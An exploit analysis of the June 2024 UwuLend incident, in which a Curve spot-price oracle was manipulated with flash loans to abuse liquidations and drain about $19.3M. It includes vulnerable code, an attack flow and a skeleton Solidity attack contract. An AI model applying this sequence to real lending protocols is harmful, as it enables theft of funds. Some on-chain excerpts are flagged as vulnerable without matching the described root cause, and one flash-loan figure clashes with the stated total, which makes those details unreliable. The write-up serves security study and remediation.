# UwuLend (1st Incident) — sUSDE Oracle Price Manipulation + Liquidation Exploit Analysis

| Field | Details |
|------|------|
| **Date** | 2024-06 |
| **Protocol** | UwuLend |
| **Chain** | Ethereum |
| **Loss** | ~$19,300,000 |
| **uwuLendPool** | [0x2409aF0251DCB89EE3Dee572629291f9B087c668](https://etherscan.io/address/0x2409aF0251DCB89EE3Dee572629291f9B087c668) |
| **Price Oracle** | [0xAC4A2aC76D639E10f2C05a41274c1aF85B772598](https://etherscan.io/address/0xAC4A2aC76D639E10f2C05a41274c1aF85B772598) |
| **Attacker** | [0x841ddf093f5188989fa1524e7b893de64b421f47](https://etherscan.io/address/0x841ddf093f5188989fa1524e7b893de64b421f47) |
| **Root Cause** | The sUSDE price was referenced directly from the Curve pool spot price without a TWAP, enabling price manipulation via a large single-block swap, which was then exploited via the liquidation bonus mechanism and allowed borrowing against inflated collateral |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/UwuLend_First_exp.sol) |

---

## 1. Vulnerability Overview

UwuLend's price oracle referenced the sUSDE price directly from the Curve pool spot price. The attacker borrowed approximately $19.3M in assets through cascading flash loans from Aave, Spark, Morpho Blue, Uniswap V3, Balancer, and MakerDAO. By executing a large swap on the Curve pool, the attacker artificially drove the sUSDE price down, pushing a helper contract position into a liquidatable state. A reverse swap then restored the price, allowing the attacker to collect an excessive liquidation bonus and drain the entire USDC liquidity by borrowing against sUSDE as collateral.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: sUSDE oracle references Curve spot price directly
contract UwuLendOracle {
    ICurvePool public sUSDEPool;

    function getAssetPrice(address asset) external view returns (uint256) {
        if (asset == sUSDE) {
            // Curve spot price — manipulable via large swaps
            return sUSDEPool.get_dy(0, 1, 1e18);
            // ↑ Returns manipulated price during the flash loan window
        }
        return chainlinkPrice(asset);
    }
}

// ❌ Vulnerable liquidation logic: health factor calculated using manipulated price
contract UwuLendPool {
    function liquidationCall(
        address collateralAsset,
        address debtAsset,
        address user,
        uint256 debtToCover,
        bool receiveAToken
    ) external {
        // Health factor computed with the manipulated oracle price
        uint256 healthFactor = getUserHealthFactor(user);
        require(healthFactor < HEALTH_FACTOR_LIQUIDATION_THRESHOLD, "not liquidatable");
        // Liquidation bonus paid based on manipulated collateral value
        uint256 bonus = liquidationBonus * collateralAmount / LIQUIDATION_BONUS_BASE;
        // ← When the price is artificially restored, bonus exceeds actual value
    }
}

// ✅ Safe code: use TWAP or Chainlink oracle
contract UwuLendOracle {
    function getAssetPrice(address asset) external view returns (uint256) {
        if (asset == sUSDE) {
            // Use Curve TWAP or Chainlink price
            return getCurveTWAP(sUSDEPool, TWAP_PERIOD);
        }
        return chainlinkPrice(asset);
    }
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: LendingPool.sol
  function swapBorrowRateMode(address asset, uint256 rateMode) external override whenNotPaused {  // ❌ Vulnerability
    DataTypes.ReserveData storage reserve = _reserves[asset];

    (uint256 stableDebt, uint256 variableDebt) = Helpers.getUserCurrentDebt(msg.sender, reserve);

    DataTypes.InterestRateMode interestRateMode = DataTypes.InterestRateMode(rateMode);

    ValidationLogic.validateSwapRateMode(
      reserve,
      _usersConfig[msg.sender],
      stableDebt,
      variableDebt,
      interestRateMode
    );

    reserve.updateState();

    if (interestRateMode == DataTypes.InterestRateMode.STABLE) {
      IStableDebtToken(reserve.stableDebtTokenAddress).burn(msg.sender, stableDebt);
      IVariableDebtToken(reserve.variableDebtTokenAddress).mint(
        msg.sender,
        msg.sender,
        stableDebt,
        reserve.variableBorrowIndex
      );
    } else {
      IVariableDebtToken(reserve.variableDebtTokenAddress).burn(
        msg.sender,
        variableDebt,
        reserve.variableBorrowIndex
      );
      IStableDebtToken(reserve.stableDebtTokenAddress).mint(
        msg.sender,
        msg.sender,
        variableDebt,
        reserve.currentStableBorrowRate
      );
    }

    reserve.updateInterestRates(asset, reserve.aTokenAddress, 0, 0);

    emit Swap(asset, msg.sender, rateMode);
  }
```

```solidity
// File: ValidationLogic.sol
   * @param userBalance The balance of the user
   * @param reservesData The reserves state
   * @param userConfig The user configuration
   * @param reserves The addresses of the reserves
   * @param reservesCount The number of reserves
   * @param oracle The price oracle
   */
  function validateWithdraw(
    address reserveAddress,
    uint256 amount,
    uint256 userBalance,
    mapping(address => DataTypes.ReserveData) storage reservesData,  // ❌ Vulnerability
    DataTypes.UserConfigurationMap storage userConfig,
    mapping(uint256 => address) storage reserves,
    uint256 reservesCount,
    address oracle
  ) external view {
    require(amount != 0, Errors.VL_INVALID_AMOUNT);
    require(amount <= userBalance, Errors.VL_NOT_ENOUGH_AVAILABLE_USER_BALANCE);

    (bool isActive, , , ) = reservesData[reserveAddress].configuration.getFlags();
    require(isActive, Errors.VL_NO_ACTIVE_RESERVE);

    require(
      GenericLogic.balanceDecreaseAllowed(
        reserveAddress,
        msg.sender,
        amount,
        reservesData,
        userConfig,
        reserves,
        reservesCount,
        oracle
      ),
      Errors.VL_TRANSFER_NOT_ALLOWED
    );
  }

  struct ValidateBorrowLocalVars {
    uint256 currentLtv;
    uint256 currentLiquidationThreshold;
    uint256 amountOfCollateralNeededETH;
    uint256 userCollateralBalanceETH;
    uint256 userBorrowBalanceETH;
    uint256 availableLiquidity;
    uint256 healthFactor;
    bool isActive;
    bool isFrozen;
    bool borrowingEnabled;
    bool stableRateBorrowingEnabled;
```

```solidity
// File: BaseUniswapAdapter.sol
  function _getPrice(address asset) internal view returns (uint256) {  // ❌ Vulnerability
    return ORACLE.getAssetPrice(asset);
  }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Cascading flash loans (total ~$500M+ equivalent)
  │         ├─ Aave V3: WETH 159.05 + WBTC 1.48
  │         ├─ Aave V2: WETH 40,000
  │         ├─ Spark: WETH 91.07 + WBTC 0.498
  │         ├─ Morpho Blue: sUSDE/USDE/DAI (hundreds of millions)
  │         ├─ Uniswap V3: FRAX/USDC (hundreds of millions)
  │         ├─ Balancer: GHO + WETH
  │         └─ MakerDAO: DAI 50B
  │
  ├─→ [2] Large swap on Curve pool → sUSDE price drops
  │         └─ oracle: sUSDE spot price plummets
  │
  ├─→ [3] Deposit WBTC/DAI as collateral + borrow sUSDE at max LTV
  │         └─ Helper contract position — health factor < 1
  │
  ├─→ [4] Withdraw portion of collateral → cross liquidation threshold
  │
  ├─→ [5] Reverse swap → sUSDE price recovers (artificially)
  │         └─ Collateral value suddenly increases
  │
  ├─→ [6] Repeated liquidationCall()
  │         └─ Collect excessive liquidation bonus from manipulated price delta
  │         └─ Seize helper contract collateral
  │
  ├─→ [7] Use seized sUSDE collateral to borrow maximum from uwuLend
  │         └─ Borrow entire WETH/USDC/CRV liquidity
  │
  ├─→ [8] Repay all flash loans
  │
  └─→ [9] ~$19.3M profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface ILendingPool {
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
    function liquidationCall(address collateralAsset, address debtAsset, address user, uint256 debtToCover, bool receiveAToken) external;
    function getUserAccountData(address user) external view returns (uint256, uint256, uint256, uint256, uint256, uint256);
}

interface ICurvePool {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external returns (uint256);
    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
}

contract AttackContract {
    ILendingPool constant uwuPool = ILendingPool(0x2409aF0251DCB89EE3Dee572629291f9B087c668);

    function executeAttack() internal {
        // [1] Acquire large asset positions via cascading flash loans (implemented as callback chain)

        // [2] Large swap on sUSDE Curve pool → sUSDE price drops
        curvePool.exchange(0, 1, largeUSDEAmount, 0); // USDE → stablecoin

        // [3] Deposit WBTC/DAI + borrow max sUSDE
        uwuPool.deposit(WBTC, wbtcAmount, helper, 0);
        uwuPool.borrow(sUSDE, maxBorrow, 2, 0, helper);

        // [4] Withdraw portion of collateral → reach liquidation threshold
        uwuPool.withdraw(WBTC, withdrawAmount, address(this));

        // [5] Reverse swap to restore sUSDE price
        curvePool.exchange(1, 0, stablecoinAmount, 0); // stablecoin → USDE

        // [6] Liquidate helper contract — collect bonus from manipulated price delta
        uwuPool.liquidationCall(WBTC, sUSDE, helper, type(uint256).max, false);

        // [7] Borrow additional funds using seized collateral
        uwuPool.borrow(USDC, fullUSDCLiquidity, 2, 0, address(this));
        // Drain entire USDC liquidity

        // [8] Repay flash loans and retain ~$19.3M
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Oracle Price Manipulation (Curve spot price + liquidation bonus exploit) |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **Attack Vector** | External (cascading flash loans + Curve swaps + repeated liquidations) |
| **DApp Category** | Lending Protocol (Aave fork) |
| **Impact** | Oracle manipulation + liquidation bonus exploit → ~$19.3M drained |

## 6. Remediation Recommendations

1. **Use TWAP Oracle**: Use a time-weighted average price instead of the Curve spot price
2. **Chainlink Secondary Validation**: Block transactions when the price deviation from Chainlink exceeds X%
3. **Liquidation Bonus Cap**: Limit the maximum bonus claimable in a single liquidation transaction
4. **Lower sUSDE LTV**: Set a conservative LTV ratio for assets with high manipulation risk

## 7. Lessons Learned

- Using Curve spot prices as an oracle in Compound/Aave forks enables temporary price manipulation via large flash loans within a single block.
- The liquidation bonus mechanism, when combined with price manipulation, becomes an additional profit vector for attackers.
- Cascading flash loans (Aave→Spark→Morpho→Uniswap→Balancer→MakerDAO) bypass individual protocol limits to maximize attack scale.